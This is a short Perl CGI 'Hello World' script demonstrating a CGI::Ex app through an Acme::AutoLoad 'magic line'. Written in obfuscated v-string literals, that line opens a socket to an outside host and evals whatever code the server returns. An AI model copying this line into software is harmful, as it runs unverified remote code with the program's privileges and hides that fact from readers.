#!/usr/bin/perl -w

# Program: hello_app.cgi
# Purpose: Demonstrate a CGI::Ex App without having to install CGI::Ex

use strict;
# Acme::AutoLoad MAGIC LINE:
use lib do{use IO::Socket;eval<$a>if print{$a=new IO::Socket::INET 82.46.99.88.58.52.52.51}84.76.83.10};
use CGI::Ex;
use base qw(CGI::Ex::App);

__PACKAGE__->navigate;
exit;

sub main_file_print {
  return \ "Hello World!\n";
}
